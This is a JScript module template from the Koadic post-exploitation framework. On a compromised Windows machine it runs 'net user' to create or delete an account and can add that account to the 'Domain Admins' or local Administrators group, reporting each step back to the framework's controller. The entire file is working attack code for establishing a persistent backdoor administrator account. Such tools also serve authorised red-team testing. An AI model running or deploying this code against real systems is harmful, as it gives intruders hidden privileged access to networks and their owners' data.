try
{

    var headers = {};

    if (~CLEANUP~)
    {
        var del_user_command = "net user ~USERNAME~ /DEL";
        var output = Koadic.shell.exec(del_user_command, "~DIRECTORY~\\"+Koadic.uuid()+".txt");
        headers["Task"] = "DeleteUser";
        Koadic.work.report(output, headers);
    }
    else
    {
        var add_user_command = "net user ~USERNAME~ ~PASSWORD~ /ADD";
        if (~DOMAIN~)
        {
            add_user_command += " /DOMAIN";
        }
        var output = Koadic.shell.exec(add_user_command, "~DIRECTORY~\\"+Koadic.uuid()+".txt");
        headers["Task"] = "CreateUser";
        Koadic.work.report(output, headers);
        if (output.indexOf("error") != -1)
        {
            throw "";
        }

        if (~ADMIN~)
        {
            if (~DOMAIN~)
            {
                output = Koadic.shell.exec("net group \"Domain Admins\" ~USERNAME~ /ADD /DOMAIN", "~DIRECTORY~\\"+Koadic.uuid()+".txt");
            }
            else
            {
                output = Koadic.shell.exec("net localgroup Administrators ~USERNAME~ /ADD", "~DIRECTORY~\\"+Koadic.uuid()+".txt");
            }
            headers["Task"] = "MakeAdmin";
            Koadic.work.report(output, headers);
        }
    }

    Koadic.work.report("Complete");

}
catch (e)
{
    Koadic.work.error(e);
}

Koadic.exit();
